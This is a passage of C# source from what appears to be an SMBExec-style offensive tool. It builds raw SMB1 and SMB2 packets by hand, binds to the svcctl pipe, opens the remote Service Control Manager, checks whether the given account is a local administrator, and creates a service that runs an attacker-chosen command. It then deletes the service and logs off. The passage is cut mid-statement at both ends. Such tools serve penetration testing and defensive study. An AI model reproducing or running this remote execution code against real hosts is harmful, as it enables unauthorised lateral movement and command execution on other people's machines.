                                case "CloseServiceHandle":
                                    {
                                        Packet_SCM_Data = new OrderedDictionary();
                                        if (SMB_Close_Service_Handle_Stage == 1)
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} deleted on {1}", SMB_Service, Target)); }
                                            Service_Deleted = true;
                                            SMB_Close_Service_Handle_Stage++;
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Context_Handle);
                                        }
                                        else
                                        {
                                            SMBClientStage = "CloseRequest";
                                            Packet_SCM_Data = SMBExec.SCMCloseServiceHandle(SMB_Service_Manager_Context_Handle);
                                        }
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x05, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBWriteAndXRequest(SMB_FID, RPC_Data.Length + SCM_Data.Length);
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        int RPC_Data_Length = SMB_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                    }
                                    break;
                                case "CloseRequest":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x04 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBCloseRequest(new byte[] { 0x00, 0x40 });
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;
                                case "TreeDisconnect":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x71 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_Tree_ID, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBTreeDisconnectRequest();
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);


                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x74 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0x34, 0xfe }, Process_ID_Bytes, SMB_User_ID);

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                            SMB_Signing_Counter += 2;
                                            SMB_Signing_Sequence = BitConverter.GetBytes(SMB_Signing_Counter).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signing_Sequence;
                                        }
                                        SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        Packet_SMB_Data = SMBExec.SMBLogoffAndXRequest();
                                        SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);


                                        if (SMB_Signing)
                                        {
                                            SMB_Sign = Session_Key.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                            SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                            SMB_Signature = Utilities.GetByteRange(SMB_Signature, 0, 7);
                                            Packet_SMB_Header["SMBHeader_Signature"] = SMB_Signature;
                                            SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }

                        }
                    }
                    else
                    {
                        SMBClientStage = "TreeConnect";
                        HMACSHA256 HMAC_SHA256 = new HMACSHA256();

                        while (SMBClientStage != "exit" && SMBExec_Failed == false)
                        {
                            if (debug) { output.AppendLine(String.Format("Current Stage {0}", SMBClientStage)); }
                            switch (SMBClientStage)
                            {
                                case "TreeConnect":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x03, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };

                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SMB2_Data = SMBExec.SMB2TreeConnectRequest(SMB_Path_Bytes);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "CreateRequest";
                                    }
                                    break;
                                case "CreateRequest":
                                    {
                                        SMB2_Tree_ID = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                        SMB_Named_Pipe_Bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x05, 0x0 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SMB2_Data = SMBExec.SMB2CreateRequestFile(SMB_Named_Pipe_Bytes);
                                        Packet_SMB2_Data["SMB2CreateRequestFIle_Share_Access"] = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "RPCBind";
                                    }
                                    break;
                                case "RPCBind":
                                    {
                                        SMB_Named_Pipe_Bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                        SMB2_Message_ID++;
                                        SMB_File_ID = Utilities.GetByteRange(SMBClientReceive, 132, 147);
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_RPC_Data = SMBExec.RPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x0, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "OpenSCManagerW";
                                    }
                                    break;
                                case "ReadRequest":
                                    {
                                        Thread.Sleep(sleep * 1000);
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x08, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        Packet_SMB2_Header["SMB2Header_CreditCharge"] = new byte[] { 0x10, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        Packet_SMB2_Data = SMBExec.SMB2ReadRequest(SMB_File_ID);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                        {
                                            SMBClientStage = SMB_Client_Stage_Next;
                                        }
                                        else
                                        {
                                            SMBClientStage = "StatusPending";
                                        }

                                    }
                                    break;

                                case "StatusPending":
                                    {
                                        SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                        {
                                            SMBClientStage = SMB_Client_Stage_Next;
                                        }
                                    }
                                    break;
                                case "OpenSCManagerW":
                                    {
                                        SMB2_Message_ID = 30;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        Packet_SCM_Data = SMBExec.SCMOpenSCManagerW(SMB_Service_Bytes, SMB_Service_Length);
                                        SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);

                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_Client_Stage_Next = "CheckAccess";

                                    }
                                    break;

                                case "CheckAccess":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 128, 131)) == "00-00-00-00" && BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 127)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                        {
                                            SMB_Service_Manager_Context_Handle = Utilities.GetByteRange(SMBClientReceive, 108, 127);
                                            if (SMB_execute)
                                            {
                                                Packet_SCM_Data = SMBExec.SCMCreateServiceW(SMB_Service_Manager_Context_Handle, SMB_Service_Bytes, SMB_Service_Length, SMBExec_Command, SMBExec_Command_Length_bytes);
                                                SCM_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SCM_Data);
                                                if (SCM_Data.Length < SMB_Split_Index)
                                                {
                                                    SMBClientStage = "CreateServiceW";
                                                }
                                                else
                                                {
                                                    SMBClientStage = "CreateServiceW_First";
                                                }
                                            }
                                            else
                                            {

                                                output.AppendLine(String.Format("{0} is a local administrator on {1}", Output_Username, Target));
                                                SMB2_Message_ID += 20;
                                                SMB_Close_Service_Handle_Stage = 2;
                                                SMBClientStage = "CloseServiceHandle";
                                            }

                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 128, 131)) == "05-00-00-00")
                                        {
                                            output.AppendLine(String.Format("{0} is not a local administrator or does not have the required privileges on {1}", Output_Username, Target));
                                            SMBExec_Failed = true;
                                        }
                                        else
                                        {
                                            output.AppendLine(String.Format("Something went wrong with {0}", Target));
                                            SMBExec_Failed = true;
                                        }

                                    }
                                    break;
                                case "CreateServiceW":
                                    {
                                        if (SMBExec_Command.Length < SMB_Split_Index)
                                        {
                                            SMB2_Message_ID += 20;
                                            Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                            Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_Signing)
                                            {
                                                Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_Data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, null);
                                            RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                            Packet_SMB_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length + SCM_Data.Length);
                                            SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            int RPC_Data_Length = SMB2_Data.Length + SCM_Data.Length + RPC_Data.Length;
                                            NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                            if (SMB_Signing)
                                            {
                                                HMAC_SHA256 = new HMACSHA256();
                                                SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                                SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                                Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                            }
                                            SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).Concat(SCM_Data).ToArray();
                                            SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                            SMBClientStage = "ReadRequest";
                                            SMB_Client_Stage_Next = "StartServiceW";

                                        }
                                    }
                                    break;
                                case "CreateServiceW_First":
                                    {
                                        SMB_Split_Stage_final = Math.Ceiling((double)SCM_Data.Length / SMB_Split_Index);
                                        SMB2_Message_ID += 20;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        byte[] SCM_Data_First = Utilities.GetByteRange(SCM_Data, 0, SMB_Split_Index - 1);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x01 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_First);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length);
                                        SMB_Split_Index_Tracker = SMB_Split_Index;
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);

                                        if (SMB_Split_Stage_final <= 2)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMB_Split_Stage = 2;
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;

                                case "CreateServiceW_Middle":
                                    {
                                        SMB_Split_Stage++;
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        byte[] SCM_Data_Middle = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SMB_Split_Index_Tracker + SMB_Split_Index - 1);
                                        SMB_Split_Index_Tracker += SMB_Split_Index;
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Middle);
                                        Packet_RPC_Data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_Data.Length - SMB_Split_Index_Tracker + SMB_Split_Index);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            Packet_SMB2_Header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        }
                                        SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                        if (SMB_Split_Stage >= SMB_Split_Stage_final)
                                        {
                                            SMBClientStage = "CreateServiceW_Last";
                                        }
                                        else
                                        {
                                            SMBClientStage = "CreateServiceW_Middle";
                                        }
                                    }
                                    break;

                                case "CreateServiceW_Last":
                                    {
                                        SMB2_Message_ID++;
                                        Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                        Packet_SMB2_Header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_Signing)
                                        {
                                            Packet_SMB2_Header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        byte[] SCM_Data_Last = Utilities.GetByteRange(SCM_Data, SMB_Split_Index_Tracker, SCM_Data.Length);
                                        Packet_RPC_Data = SMBExec.RPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_Data_Last);
                                        RPC_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC_Data);
                                        Packet_SMB2_Data = SMBExec.SMB2WriteRequest(SMB_File_ID, RPC_Data.Length);
                                        SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                        SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                        int RPC_Data_Length = SMB2_Data.Length + RPC_Data.Length;
                                        NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, RPC_Data_Length);
                                        if (SMB_Signing)
                                        {
                                            HMAC_SHA256 = new HMACSHA256();
                                            SMB2_Sign = SMB2_Header.Concat(SMB2_Data).Concat(RPC_Data).ToArray();
                                            SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
